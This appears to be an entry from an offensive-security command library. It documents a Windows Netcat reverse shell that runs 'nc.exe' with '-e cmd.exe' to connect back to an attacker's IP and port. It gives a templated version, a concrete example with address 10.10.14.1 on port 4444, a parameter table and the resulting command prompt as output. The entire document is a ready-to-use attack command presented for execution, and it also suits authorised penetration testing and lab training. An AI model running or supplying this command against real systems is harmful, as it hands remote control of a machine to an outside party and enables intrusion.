---
id: 66a7794d-36e5-4709-913a-4002cc785293
type: command
executor: command_prompt
data: cmd.exe /C "nc.exe $_ATTACKER_IP $_ATTACKER_PORT -e cmd.exe"
output: |-
  Microsoft Windows [Version 10.0.19041.1]
  (c) 2019 Microsoft Corporation. All rights reserved.

  C:\Windows\system32>
created_at: '2019-12-05T22:28:02.926175+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - reverse-shell
  - execution
verified: true
validated: true
---

# Execute Netcat Command Shell Cmd Exe RCE

## Command

```command_prompt
cmd.exe /C "nc.exe $_ATTACKER_IP $_ATTACKER_PORT -e cmd.exe"
```

## Description

Executes Netcat to connect back to attacker and bind cmd.exe for reverse shell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /C | Run command and terminate | Yes |
| nc.exe | Path to nc binary | Yes |
| $_ATTACKER_IP | Attacker IP | Yes |
| $_ATTACKER_PORT | Listener port | Yes |
| -e cmd.exe | Execute cmd on connect | Yes |

## Examples

### Basic Usage

```command_prompt
cmd.exe /C "nc.exe 10.10.14.1 4444 -e cmd.exe"
```

## Expected Output

Connects to listener, providing cmd shell prompt.

## Related

- [[procedures/upgrade-website-rce-to-netcat-reverse-shell-windows]]
